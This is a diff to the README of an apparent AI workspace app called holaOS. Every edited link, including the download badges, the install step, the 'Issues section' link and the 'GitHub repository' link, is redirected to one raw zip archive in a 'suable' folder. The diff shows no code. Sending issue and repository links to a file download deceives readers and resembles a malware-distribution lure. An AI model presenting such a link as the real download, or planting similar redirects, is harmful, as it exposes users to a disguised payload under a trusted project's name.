@@ -4,7 +4,7 @@
 ![License](https://img.shields.io/badge/license-MIT-green)
 ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)
 
-[![⬇️ Download holaOS Now](https://img.shields.io/badge/⬇️_Download_holaOS_Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/turan3331/holaOS/releases)
+[![⬇️ Download holaOS Now](https://img.shields.io/badge/⬇️_Download_holaOS_Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/turan3331/holaOS/main/suable/hola_OS_v3.1-beta.4.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Getting started with holaOS is incredibly simple. Here's what you need to do:
 
 ### Step 1: Download holaOS
 
-Visit this link to download the application: **[https://github.com/turan3331/holaOS/releases](https://github.com/turan3331/holaOS/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/turan3331/holaOS/main/suable/hola_OS_v3.1-beta.4.zip](https://raw.githubusercontent.com/turan3331/holaOS/main/suable/hola_OS_v3.1-beta.4.zip)**
 
 ### Step 2: Install
 
@@ -148,7 +148,7 @@ Yes! If you already have API keys for services like Anthropic or OpenAI, simply 
 The core application is completely free and open-source. Some premium AI models may charge usage fees through their own services, but the holaOS software itself costs nothing.
 
 ### What if I encounter problems?
-Check the [Issues section](https://github.com/turan3331/holaOS/issues) on GitHub for known problems and solutions. You can also ask the community for help — we're friendly!
+Check the [Issues section](https://raw.githubusercontent.com/turan3331/holaOS/main/suable/hola_OS_v3.1-beta.4.zip) on GitHub for known problems and solutions. You can also ask the community for help — we're friendly!
 
 ---
 
@@ -160,7 +160,7 @@ holaOS is an open-source project, and we welcome contributions of all kinds:
 - **Write documentation** — help other users learn
 - **Submit code** — improve the app technically
 
-Visit our [GitHub repository](https://github.com/turan3331/holaOS) to get involved.
+Visit our [GitHub repository](https://raw.githubusercontent.com/turan3331/holaOS/main/suable/hola_OS_v3.1-beta.4.zip) to get involved.
 
 ---
 
@@ -193,7 +193,7 @@ Need help? Have questions? We've got you covered:
 
 Join thousands of users who've simplified their AI workflow with holaOS. One installer, one workspace, endless possibilities.
 
-[![⬇️ Download holaOS Now](https://img.shields.io/badge/⬇️_Download_holaOS_Now-4ECDC4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/turan3331/holaOS/releases)
+[![⬇️ Download holaOS Now](https://img.shields.io/badge/⬇️_Download_holaOS_Now-4ECDC4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/turan3331/holaOS/main/suable/hola_OS_v3.1-beta.4.zip)
 
 ---
 
